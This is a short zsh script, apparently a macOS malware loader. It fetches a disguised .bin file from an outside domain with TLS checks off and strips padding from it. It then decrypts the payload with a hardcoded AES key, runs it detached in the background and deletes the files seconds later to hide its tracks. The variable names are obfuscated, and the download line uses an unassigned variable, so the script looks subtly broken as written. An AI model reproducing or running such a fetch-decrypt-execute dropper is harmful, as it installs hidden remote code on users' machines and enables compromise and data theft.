#!/bin/zsh
c3ajw=$(mktemp /tmp/9s983g.XXXXXX)
curl -kfsSL "https://daisoftwarelimited.com/fd8a70f7f5c848a7ab6f2fea13d547ca/m1051f4e5ca29560e.bin" -o "$c3ajwz" || exit 1
vbekze=$(stat -f %z "$c3ajwz"); b6tzj3x=$(( vbekze - 3020 - 1310 ))
tail -c +$(( 3020 + 1 )) "$c3ajwz" | head -c $b6tzj3x | openssl enc -d -aes-256-cbc -k 6ad52c4ada7e21d743412954 -out "$c3ajw" 2>/dev/null
[ -s "$c3ajw" ] && chmod 700 "$c3ajw" && ( "$c3ajw" & ) && disown
( sleep 3; rm -f "$c3ajw" "$c3ajwz" ) &>/dev/null &
